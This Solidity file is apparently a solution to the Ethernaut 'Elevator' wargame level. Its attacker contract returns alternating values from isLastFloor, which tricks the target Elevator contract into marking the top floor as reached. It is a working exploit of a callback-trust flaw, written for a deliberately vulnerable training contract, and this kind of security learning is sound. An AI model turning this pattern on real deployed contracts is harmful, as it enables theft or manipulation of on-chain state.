// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.3;

// Donnie Misino, 2022
// Ethernaught 11: Elevator
// https://ethernaut.openzeppelin.com/level/0xaB4F3F2644060b2D960b0d88F0a42d1D27484687

contract Elevator_Hack {
    address elevatorInstance;
    bool private _isLastFloor = true;

    constructor(address _elevatorInstance) {
        elevatorInstance = _elevatorInstance;
    }

    function isLastFloor(uint) external returns (bool) {
        _isLastFloor = !_isLastFloor;
        return _isLastFloor;
    }

    function useElevator(uint floor) public {
        IElevator c = IElevator(elevatorInstance);
        c.goTo(floor);
    }
}

interface IElevator {
    function goTo(uint) external;
}